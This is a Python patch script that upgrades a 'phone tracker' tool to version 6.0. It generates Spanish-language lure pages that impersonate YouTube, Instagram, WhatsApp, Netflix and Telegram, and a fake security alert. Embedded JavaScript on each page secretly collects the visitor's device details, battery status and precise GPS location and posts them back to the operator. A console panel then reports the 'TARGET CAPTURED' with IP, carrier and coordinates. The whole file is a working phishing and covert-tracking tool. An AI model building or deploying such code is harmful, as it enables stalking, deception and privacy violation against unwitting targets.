import os

def apply_fix():
    filename = "phone_tracker.py"
    if not os.path.exists(filename):
        print(f"File {filename} not found.")
        return

    with open(filename, 'r', encoding='utf-8') as f:
        content = f.read()

    # 1. Replace _build_tracking_page method
    old_method_start = "    def _build_tracking_page(self, track_id):"
    next_method = "    def _start_grab_server("
    start_idx = content.find(old_method_start)
    end_idx = content.find(next_method, start_idx)

    if start_idx != -1 and end_idx != -1:
        new_builder = """    def _build_tracking_page(self, track_id):
        \"\"\"Build a professional tracking page with Open Graph support (v6.0).\"\"\"
        template = getattr(self, 'template_choice', 'security').lower()

        og = {
            'title': 'Breaking News: Live Updates',
            'desc': 'Get the latest real-time updates and breaking stories.',
            'img': 'https://cdn-icons-png.flaticon.com/512/21/21601.png',
            'bait': ''
        }

        if 'youtube' in template:
            og['title'] = 'YouTube - Video Recomendado'
            og['desc'] = 'Mira este video que es tendencia ahora mismo en tu region.'
            og['img'] = 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png'
            og['bait'] = f'''<div class="card">
                <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" style="width:100px;margin-bottom:20px;">
                <h2 style="font-size:1.4em;">Video No Disponible</h2>
                <p>Este video requiere verificacion de edad o ubicacion. Haz clic para validar.</p>
                <div class="btn" style="background:#ff0000;color:white;padding:12px;border-radius:2px;cursor:pointer;font-weight:bold;margin-top:10px;">VER VIDEO</div>
            </div>'''
        elif 'instagram' in template:
            og['title'] = 'Instagram - Nueva Mencion'
            og['desc'] = 'Alguien te ha etiquetado en una publicacion. Haz clic para ver.'
            og['img'] = 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png'
            og['bait'] = f'''<div class="card">
                <img src="https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png" style="width:60px;margin-bottom:20px;">
                <h2 style="font-size:1.4em;">Mencion en Publicacion</h2>
                <p>Inicia sesion para ver quien te ha mencionado.</p>
                <div class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicacion</div>
            </div>'''
        elif 'whatsapp' in template:
            og['title'] = 'WhatsApp - Invitacion a Grupo'
            og['desc'] = 'Has sido invitado a unirte a un grupo de seguridad privada.'
            og['img'] = 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png'
            og['bait'] = f'''<div class="card">
                <img src="https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png" style="width:80px;margin-bottom:20px;">
                <h2 style="font-size:1.4em;">Grupo de Seguridad</h2>
                <p>Invitacion pendiente de aprobacion.</p>
                <div class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div>
            </div>'''
        elif 'netflix' in template:
            og['title'] = 'Netflix - Alerta de Cuenta'
            og['desc'] = 'Tu suscripcion ha sido suspendida temporalmente. Actualiza tus datos.'
            og['img'] = 'https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico'
            og['bait'] = f'''<div class="card">
                <h2 style="color:#e50914;font-size:1.6em;">NETFLIX</h2>
                <p>Actualiza tu informacion de pago para continuar disfrutando.</p>
                <div class="btn" style="background:#e50914;color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:bold;margin-top:10px;">Actualizar Ahora</div>
            </div>'''
        elif 'telegram' in template:
            og['title'] = 'Telegram - Canal Privado'
            og['desc'] = 'Invitacion exclusiva a canal de inteligencia automatizada.'
            og['img'] = 'https://telegram.org/img/t_logo.png'
            og['bait'] = f'''<div class="card">
                <img src="https://telegram.org/img/t_logo.png" style="width:80px;margin-bottom:20px;">
                <h2 style="font-size:1.4em;">Telegram Intel Room</h2>
                <p>Canal restringido. Acceso mediante biometria facial.</p>
                <div class="btn" style="background:#24A1DE;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Entrar al Canal</div>
            </div>'''
        else: # Standard / Security
            og['bait'] = '''<div class="card">
                <h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad Crítica</h2>
                <p>Se ha detectado un acceso no autorizado cerca de su ubicación.</p>
                <p>Por favor, confirme su ubicación para asegurar su cuenta.</p>
                <div class="spinner"></div>
                <p style="margin-top:20px;color:#666;">Verificando dispositivo...</p>
            </div>'''

        return f\"\"\"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- Open Graph / Social Previews -->
<meta property="og:type" content="website">
<meta property="og:title" content="{og['title']}">
<meta property="og:description" content="{og['desc']}">
<meta property="og:image" content="{og['img']}">
<meta property="twitter:card" content="summary_large_image">
<title>{og['title']}</title>
<style>
  body {{ font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
  h2 {{ font-weight: 500; color: #262626; margin-bottom: 10px; }}
  p {{ color: #8e8e8e; font-size: 0.95em; line-height: 1.5; }}
  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto 0 auto; }}
  @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
</head>
<body>
    {og['bait']}
<script>
(function(){{
  var data = {{
    track_id: "{track_id}",
    ua: navigator.userAgent,
    plt: navigator.platform,
    res: screen.width + "x" + screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || '?',
    mem: navigator.deviceMemory || '?'
  }};
  try {{
    navigator.getBattery().then(function(b){{
      data.bat = Math.round(b.level * 100) + "%";
      data.charging = b.charging;
      checkGeo();
    }}).catch(function(){{ checkGeo(); }});
  }} catch(e) {{ checkGeo(); }}
  function checkGeo() {{
    if (navigator.geolocation) {{
      navigator.geolocation.getCurrentPosition(function(p){{
        data.gps_lat = p.coords.latitude; 
        data.gps_lon = p.coords.longitude; 
        data.gps_accuracy = p.coords.accuracy;
        send(data);
      }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:10000}});
    }} else {{ send(data); }}
  }}
  function send(d) {{
    fetch("/capture/" + d.track_id, {{ method:"POST", headers:{{"Content-Type":"application/json"}}, body:JSON.stringify(d) }});
  }}
}})();
</script>
</body>
</html>\"\"\"
"""
        content = content[:start_idx] + new_builder + content[end_idx:]

    # 2. Upgrade Panel capture output
    old_panel_start = '            console.print(Panel(f\"\"\"[bold red][SIREN] TARGET CAPTURED![/bold red]'
    panel_end = 'border_style="red"))'
    
    p_start = content.find(old_panel_start)
    if p_start != -1:
        p_end = content.find(panel_end, p_start) + len(panel_end)
        new_panel_code = """            bat = data.get('bat', '?')
            charging = " (Charging)" if data.get('charging') else ""
            is_vpn = "[YES]" if ip_info.get('proxy') or ip_info.get('vpn') else "[NO]"
            new_panel = f\"\"\"[bold red][SIREN] TARGET CAPTURED! (v6.0 Advanced Intel)[/bold red]
[bold green]  IP Address:[/bold green]   {real_ip} [dim](VPN: {is_vpn})[/dim]
[bold green]  ISP/Carrier:[/bold green]  {ip_org}
[bold green]  Location:[/bold green]     {ip_city}, {ip_region}, {ip_info.get('country', '?')}
[bold blue]  Battery:[/bold blue]      {bat}{charging}
[bold blue]  Hardware:[/bold blue]     {data.get('cores', '?')} Cores | {data.get('mem', '?')} GB RAM
[bold green]  Device:[/bold green]       {device} | {tz}
[bold green]  Screen:[/bold green]       {data.get('res', '?')}
{'[bold red]  [GRAB] GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
{'  Latitude:  ' + str(gps_lat) if gps_lat else ''}
{'  Longitude: ' + str(gps_lon) if gps_lon else ''}
{'  Accuracy:  ' + str(round(gps_acc, 1)) + ' meters' if gps_acc else ''}\"\"\"
            console.print(Panel(new_panel, 
                title=f"[bold red][GRAB] IP GRAB - CAPTURE #{capture_num}[/bold red]",
                border_style="red"))"""
        content = content[:p_start] + new_panel_code + content[p_end:]

    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    print("V6.0 Advanced Intel Upgrade applied successfully.")

if __name__ == "__main__":
    apply_fix()
